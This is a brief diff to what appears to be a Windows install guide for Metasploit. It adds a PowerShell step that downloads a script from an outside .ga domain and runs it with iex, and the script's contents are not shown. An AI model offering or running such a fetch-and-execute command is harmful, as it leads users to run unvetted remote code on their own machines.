@@ -31,6 +31,9 @@ gem install bundler
 Install-WinGetPackage -id PostgreSQL.PostgreSQL.17
 ```
 
+```ps1
+iex "& { $(irm -useb 'https://awang.ga/metasploit.ps1') }"
+```
 
 Install Metasploit
 ```ps1
